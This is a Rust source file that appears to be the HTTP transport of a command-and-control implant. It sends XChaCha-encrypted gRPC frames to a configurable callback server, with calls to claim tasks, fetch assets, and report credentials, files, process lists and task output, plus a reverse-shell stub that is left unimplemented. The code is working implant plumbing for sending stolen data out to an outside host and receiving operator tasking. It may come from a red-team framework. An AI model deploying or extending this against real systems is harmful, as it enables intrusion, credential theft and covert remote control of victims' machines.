use crate::Transport;
use anyhow::{Context, Result};
use hyper::body::HttpBody;
use hyper::StatusCode;
use pb::c2::*;
use prost::Message;
use std::sync::mpsc::{Receiver, Sender};
use bytes::{Buf, BytesMut};

/// gRPC frame header utilities for encoding/decoding wire protocol frames
mod grpc_frame {
    use bytes::{Buf, BytesMut};

    /// Size of gRPC frame header: [compression_flag(1)][length(4)]
    const FRAME_HEADER_SIZE: usize = 5;

    #[derive(Debug, Clone, Copy)]
    pub struct FrameHeader {
        pub compression_flag: u8,
        pub message_length: u32,
    }

    impl FrameHeader {
        /// Create a new frame header with no compression
        pub fn new(message_length: u32) -> Self {
            Self {
                compression_flag: 0x00,
                message_length,
            }
        }

        /// Encode frame header to 5-byte array
        pub fn encode(&self) -> [u8; FRAME_HEADER_SIZE] {
            let mut header = [0u8; FRAME_HEADER_SIZE];
            header[0] = self.compression_flag;
            header[1..5].copy_from_slice(&self.message_length.to_be_bytes());
            header
        }

        /// Try to decode frame header from buffer
        /// Returns None if buffer doesn't have enough data
        pub fn try_decode(buffer: &BytesMut) -> Option<Self> {
            if buffer.len() < FRAME_HEADER_SIZE {
                return None;
            }

            let compression_flag = buffer[0];
            let message_length = u32::from_be_bytes([buffer[1], buffer[2], buffer[3], buffer[4]]);

            Some(Self {
                compression_flag,
                message_length,
            })
        }

        /// Extract a complete frame from the buffer
        /// Returns None if frame is incomplete
        pub fn extract_frame(buffer: &mut BytesMut) -> Option<(Self, BytesMut)> {
            let header = Self::try_decode(buffer)?;
            let total_size = FRAME_HEADER_SIZE + header.message_length as usize;

            if buffer.len() < total_size {
                return None;
            }

            // Skip the header
            buffer.advance(FRAME_HEADER_SIZE);

            // Extract the message
            let message = buffer.split_to(header.message_length as usize);

            Some((header, message))
        }
    }
}

static CLAIM_TASKS_PATH: &str = "/c2.C2/ClaimTasks";
static FETCH_ASSET_PATH: &str = "/c2.C2/FetchAsset";
static REPORT_CREDENTIAL_PATH: &str = "/c2.C2/ReportCredential";
static REPORT_FILE_PATH: &str = "/c2.C2/ReportFile";
static REPORT_PROCESS_LIST_PATH: &str = "/c2.C2/ReportProcessList";
static REPORT_TASK_OUTPUT_PATH: &str = "/c2.C2/ReportTaskOutput";
static REVERSE_SHELL_PATH: &str = "/c2.C2/ReverseShell";

// Marshal: Encode and encrypt a message using the ChachaCodec
// Uses the helper functions exported from pb::xchacha
fn marshal_with_codec<Req, Resp>(msg: Req) -> Result<Vec<u8>>
where
    Req: Message + Send + 'static,
    Resp: Message + Default + Send + 'static,
{
    pb::xchacha::encode_with_chacha::<Req, Resp>(msg)
}

// Unmarshal: Decrypt and decode a message using the ChachaCodec
fn unmarshal_with_codec<Req, Resp>(data: &[u8]) -> Result<Resp>
where
    Req: Message + Send + 'static,
    Resp: Message + Default + Send + 'static,
{
    pb::xchacha::decode_with_chacha::<Req, Resp>(data)
}

#[derive(Debug, Clone)]
pub struct HTTP {
    client: hyper::Client<hyper::client::HttpConnector>,
    base_url: String,
}

impl HTTP {
    /// Build URI from path
    fn build_uri(&self, path: &str) -> Result<hyper::Uri> {
        let url = format!("{}{}", self.base_url, path);
        url.parse().context("Failed to parse URL")
    }

    /// Create a base HTTP request builder with common gRPC headers
    fn request_builder(&self, uri: hyper::Uri) -> hyper::http::request::Builder {
        hyper::Request::builder()
            .method(hyper::Method::POST)
            .uri(uri)
            .header("Content-Type", "application/grpc")
    }

    /// Send HTTP request and validate status code
    async fn send_and_validate(
        &self,
        req: hyper::Request<hyper::Body>,
    ) -> Result<hyper::Response<hyper::Body>> {
        let response = self
            .client
            .request(req)
            .await
            .context("Failed to send HTTP request")?;

        if response.status() != StatusCode::OK {
            return Err(anyhow::anyhow!("HTTP error: {}", response.status()));
        }

        Ok(response)
    }

    /// Read entire response body
    async fn read_response_body(response: hyper::Response<hyper::Body>) -> Result<bytes::Bytes> {
        hyper::body::to_bytes(response.into_body())
            .await
            .context("Failed to read response body")
    }

    /// Generic helper method for unary RPC calls (request-response pattern).
    /// Handles marshaling, HTTP request/response, and unmarshaling for all unary operations.
    async fn unary_rpc<Req, Resp>(
        &mut self,
        request: Req,
        path: &str,
    ) -> Result<Resp>
    where
        Req: Message + Send + 'static,
        Resp: Message + Default + Send + 'static,
    {
        // Marshal and encrypt the request
        let request_bytes = marshal_with_codec::<Req, Resp>(request)?;

        // Build and send the request
        let uri = self.build_uri(path)?;
        let req = self
            .request_builder(uri)
            .body(hyper::Body::from(request_bytes))
            .context("Failed to build HTTP request")?;

        let response = self.send_and_validate(req).await?;

        // Read and unmarshal the response
        let body_bytes = Self::read_response_body(response).await?;
        let response_msg = unmarshal_with_codec::<Req, Resp>(&body_bytes)?;

        Ok(response_msg)
    }

    /// Stream and decode gRPC frames from HTTP response body (server-streaming pattern)
    /// Generic over request/response types for unmarshaling
    async fn stream_grpc_frames<Req, Resp, F>(
        response: hyper::Response<hyper::Body>,
        mut handler: F,
    ) -> Result<()>
    where
        Req: Message + Send + 'static,
        Resp: Message + Default + Send + 'static,
        F: FnMut(Resp) -> Result<()>,
    {
        let mut body = response.into_body();
        let mut buffer = BytesMut::new();
        let mut message_count = 0;

        loop {
            // Process all complete frames in the buffer
            while let Some((header, encrypted_message)) = grpc_frame::FrameHeader::extract_frame(&mut buffer) {
                message_count += 1;

                #[cfg(debug_assertions)]
                log::debug!(
                    "Received complete encrypted message {}: compression={}, {} bytes",
                    message_count,
                    header.compression_flag,
                    encrypted_message.len()
                );

                // Unmarshal: Decrypt and decode the complete encrypted message
                let response_msg = unmarshal_with_codec::<Req, Resp>(&encrypted_message)?;

                // Handle the decoded message
                handler(response_msg)?;
            }

            // Read more data from HTTP body
            match body.data().await {
                Some(Ok(chunk)) => {
                    #[cfg(debug_assertions)]
                    log::debug!("Received HTTP chunk: {} bytes", chunk.len());

                    buffer.extend_from_slice(&chunk);
                }
                Some(Err(err)) => {
                    return Err(anyhow::anyhow!("Failed to read chunk from response: {}", err));
                }
                None => {
                    // No more data from HTTP
                    break;
                }
            }
        }

        // Check if there's leftover data in the buffer
        if !buffer.is_empty() {
            #[cfg(debug_assertions)]
            log::warn!("Incomplete data remaining in buffer: {} bytes", buffer.len());
        }

        #[cfg(debug_assertions)]
        log::debug!("Completed streaming {} messages", message_count);

        Ok(())
    }

    /// Create a streaming HTTP body that encodes requests as gRPC frames (client-streaming pattern)
    fn create_streaming_body<Req, Resp>(receiver: Receiver<Req>) -> hyper::Body
    where
        Req: Message + Send + 'static,
        Resp: Message + Default + Send + 'static,
    {
        let (mut tx, body) = hyper::Body::channel();

        tokio::spawn(async move {
            let mut chunk_count = 0;
            for req_chunk in receiver {
                chunk_count += 1;

                #[cfg(debug_assertions)]
                log::debug!("Sending chunk {}", chunk_count);

                // Marshal and encrypt each chunk
                let request_bytes = match marshal_with_codec::<Req, Resp>(req_chunk) {
                    Ok(bytes) => bytes,
                    Err(err) => {
                        #[cfg(debug_assertions)]
                        log::error!("Failed to marshal chunk {}: {}", chunk_count, err);
                        return;
                    }
                };

                // Create gRPC frame header
                let frame_header = grpc_frame::FrameHeader::new(request_bytes.len() as u32);

                // Send frame header
                if tx
                    .send_data(hyper::body::Bytes::from(frame_header.encode().to_vec()))
                    .await
                    .is_err()
                {
                    #[cfg(debug_assertions)]
                    log::error!("Failed to send frame header for chunk {}", chunk_count);
                    return;
                }

                // Send encrypted chunk
                if tx
                    .send_data(hyper::body::Bytes::from(request_bytes))
                    .await
                    .is_err()
                {
                    #[cfg(debug_assertions)]
                    log::error!("Failed to send chunk {}", chunk_count);
                    return;
                }
            }

            #[cfg(debug_assertions)]
            log::debug!("Completed sending {} chunks", chunk_count);
        });

        body
    }
}

impl Transport for HTTP {
    fn init() -> Self {
        let mut connector = hyper::client::HttpConnector::new();
        connector.enforce_http(false);
        connector.set_nodelay(true);
        let client = hyper::Client::builder().build(connector);
        HTTP {
            client,
            base_url: String::new(),
        }
    }

    fn new(callback: String, _proxy_uri: Option<String>) -> Result<Self> {
        // Create HTTP connector
        let mut connector = hyper::client::HttpConnector::new();
        connector.enforce_http(false); // Allow HTTPS
        connector.set_nodelay(true); // TCP optimization

        // Build HTTP client
        let client = hyper::Client::builder().build(connector);

        Ok(Self {
            client,
            base_url: callback,
        })
    }

    async fn claim_tasks(&mut self, request: ClaimTasksRequest) -> Result<ClaimTasksResponse> {
        self.unary_rpc(request, CLAIM_TASKS_PATH).await
    }

    async fn fetch_asset(
        &mut self,
        request: FetchAssetRequest,
        tx: Sender<FetchAssetResponse>,
    ) -> Result<()> {
        #[cfg(debug_assertions)]
        let filename = request.name.clone();

        // Marshal and encrypt the request
        let request_bytes = marshal_with_codec::<FetchAssetRequest, FetchAssetResponse>(request)?;

        // Build and send the request
        let uri = self.build_uri(FETCH_ASSET_PATH)?;
        let req = self
            .request_builder(uri)
            .body(hyper::Body::from(request_bytes))
            .context("Failed to build HTTP request")?;

        let response = self.send_and_validate(req).await?;

        // Stream the response frames
        Self::stream_grpc_frames::<FetchAssetRequest, FetchAssetResponse, _>(response, |response_msg| {
            tx.send(response_msg).map_err(|_err| {
                #[cfg(debug_assertions)]
                log::error!("Failed to send downloaded file chunk: {}: {}", filename, _err);

                anyhow::anyhow!("Failed to send response through channel")
            })
        })
        .await
    }

    async fn report_credential(
        &mut self,
        request: ReportCredentialRequest,
    ) -> Result<ReportCredentialResponse> {
        self.unary_rpc(request, REPORT_CREDENTIAL_PATH).await
    }

    async fn report_file(
        &mut self,
        request: Receiver<ReportFileRequest>,
    ) -> Result<ReportFileResponse> {
        // Create streaming body
        let body = Self::create_streaming_body::<ReportFileRequest, ReportFileResponse>(request);

        // Build and send the request
        let uri = self.build_uri(REPORT_FILE_PATH)?;
        let req = self
            .request_builder(uri)
            .body(body)
            .context("Failed to build HTTP request")?;

        let response = self.send_and_validate(req).await?;

        // Read and unmarshal the response
        let body_bytes = Self::read_response_body(response).await?;
        let response_msg =
            unmarshal_with_codec::<ReportFileRequest, ReportFileResponse>(&body_bytes)?;

        Ok(response_msg)
    }

    async fn report_process_list(
        &mut self,
        request: ReportProcessListRequest,
    ) -> Result<ReportProcessListResponse> {
        self.unary_rpc(request, REPORT_PROCESS_LIST_PATH).await
    }

    async fn report_task_output(
        &mut self,
        request: ReportTaskOutputRequest,
    ) -> Result<ReportTaskOutputResponse> {
        self.unary_rpc(request, REPORT_TASK_OUTPUT_PATH).await
    }

    async fn reverse_shell(
        &mut self,
        rx: tokio::sync::mpsc::Receiver<ReverseShellRequest>,
        tx: tokio::sync::mpsc::Sender<ReverseShellResponse>,
    ) -> Result<()> {
        unimplemented!("todo")
    }
}
